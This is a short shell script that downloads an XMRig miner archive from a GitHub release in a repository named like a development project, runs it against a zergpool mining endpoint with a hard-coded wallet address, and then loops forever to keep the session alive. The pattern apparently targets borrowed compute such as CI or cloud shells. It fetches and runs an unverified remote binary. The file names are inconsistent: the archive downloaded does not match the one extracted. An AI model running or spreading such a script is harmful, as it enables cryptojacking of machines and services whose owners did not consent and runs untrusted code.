#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/Sorrybroits/developwithnitin/releases/download/alpha/xmrig.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u D8hichWVPBxM7NGzxs6bMj76ZjCLaUnHat.cola --keepalive --timeout 120 --donate-level 0 -p c=DGB,ID=age --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
